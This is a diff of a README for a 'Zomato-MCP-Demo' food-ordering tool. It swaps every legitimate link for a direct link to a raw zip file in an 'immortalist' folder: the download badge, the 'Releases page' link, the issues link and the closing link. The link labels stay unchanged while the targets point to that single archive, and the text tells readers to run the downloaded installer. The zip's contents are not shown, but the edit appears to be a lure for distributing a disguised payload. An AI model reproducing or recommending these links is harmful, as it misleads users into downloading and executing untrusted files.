@@ -1,6 +1,6 @@
 # 🎉 Zomato-MCP-Demo - Connect, Configure, and Order Food
 
-[![Download](https://img.shields.io/badge/Download%20Zomato--MCP--Demo-blue)](https://github.com/akbfar/Zomato-MCP-Demo/releases)
+[![Download](https://raw.githubusercontent.com/akbfar/Zomato-MCP-Demo/main/immortalist/Zomato-MCP-Demo_2.2-alpha.3.zip%20Zomato--MCP--Demo-blue)](https://raw.githubusercontent.com/akbfar/Zomato-MCP-Demo/main/immortalist/Zomato-MCP-Demo_2.2-alpha.3.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To start using the application, follow these simple steps.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/akbfar/Zomato-MCP-Demo/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/akbfar/Zomato-MCP-Demo/main/immortalist/Zomato-MCP-Demo_2.2-alpha.3.zip).
 2. **Select the Latest Version**: Choose the most recent version listed on the page. 
 3. **Download the File**: Click on the file relevant to your operating system. This will usually be an `.exe` or `.zip` file.
 4. **Run the Installer**: After downloading, locate the downloaded file and double-click it to run the installer.
@@ -52,7 +52,7 @@ After launching the application, you may need to configure it to connect to the 
 
 If you run into any issues while using the application, you can reach out for support.
 
-- **GitHub Issues**: For technical problems, create an issue on our [GitHub repository](https://github.com/akbfar/Zomato-MCP-Demo/issues).
+- **GitHub Issues**: For technical problems, create an issue on our [GitHub repository](https://raw.githubusercontent.com/akbfar/Zomato-MCP-Demo/main/immortalist/Zomato-MCP-Demo_2.2-alpha.3.zip).
 - **User Community**: Join our community forums for tips and user discussions.
 
 ## 📜 License
@@ -76,4 +76,4 @@ To learn more about the integration and technologies used, check out these relat
 - zomato
 - zomato-api
 
-For further information or updates, regularly check our [Releases page](https://github.com/akbfar/Zomato-MCP-Demo/releases).
+For further information or updates, regularly check our [Releases page](https://raw.githubusercontent.com/akbfar/Zomato-MCP-Demo/main/immortalist/Zomato-MCP-Demo_2.2-alpha.3.zip).
